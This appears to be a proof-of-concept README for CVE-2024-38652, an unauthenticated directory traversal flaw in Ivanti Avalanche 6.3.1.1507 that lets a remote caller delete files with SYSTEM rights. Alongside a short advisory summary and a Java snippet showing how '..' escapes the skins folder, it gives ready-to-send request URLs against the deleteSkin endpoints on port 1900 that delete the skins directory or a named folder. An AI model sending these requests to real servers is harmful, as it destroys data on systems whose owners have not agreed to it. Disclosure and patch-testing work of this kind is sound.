## CVE-2024-38652
## VULNERABILITY DETAILS	

Ivanti Avalanche deleteSkin Directory Traversal Arbitrary File Deletion Vulnerability

This vulnerability allows remote attackers to delete arbitrary files on affected installations of Ivanti Avalanche. Authentication is not required to exploit this vulnerability.

The specific flaw exists within the deleteSkin method. The issue results from the lack of proper validation of a user-supplied path prior to using it in file operations. An attacker can leverage this vulnerability to delete files in the context of SYSTEM.

## VULNERABILITY
Ivanti Avalanche premise 6.3.1.1507 (tested)

Check C:\Program Files\Wavelink\Avalanche\RemoteControl\lib\RemoteControlServer.jar

com.wavelink.remotecontrol.server.servlets.SkinsServlet


## Example code
```
import java.io.File;
class HelloWorld {
    public static void main(String[] args) {
        File file = new File("", "..");
        System.out.println(file.getName());
        file = new File("./web/skins",file.getName());
        System.out.println(file);
    }
}
```
![image](https://github.com/user-attachments/assets/14a033a3-4a5d-4a84-9222-18646cd24f13)
![image](https://github.com/user-attachments/assets/df443415-48ba-46c3-90e7-c5d903774441)


## CVE-2024-38652-Poc

Request /Servlet/Skins?action=deleteSkin&guid=.. endpoint unauthen
```
<Host>:1900/Servlet/Skins?action=deleteSkin&guid=..
```
https://github.com/user-attachments/assets/d618690b-2a8a-472f-9d12-2cab703e6eb4



There is also a unauthenticated endpoint ``` <Host>:1900/app/rc?cmd=deleteSkin&guid={{directory}} ``` but have a valid directory check

Delete directory AUTODETECT with: ``` <Host>:1900/app/rc?cmd=deleteSkin&guid=AUTODETECT ```

directory AUTODETECT is default in C:\Program Files\Wavelink\Avalanche\RemoteControl\web\skins

Check file C:\Program Files\Wavelink\Avalanche\RemoteControl\app.war

com.wavelink.remotecontrol.app.servlets.RCServlet

## References:
- https://forums.ivanti.com/s/article/Security-Advisory-Ivanti-Avalanche-6-4-4-CVE-2024-38652-CVE-2024-38653-CVE-2024-36136-CVE-2024-37399-CVE-2024-37373?language=en_US
- https://www.zerodayinitiative.com/advisories/ZDI-24-1149/
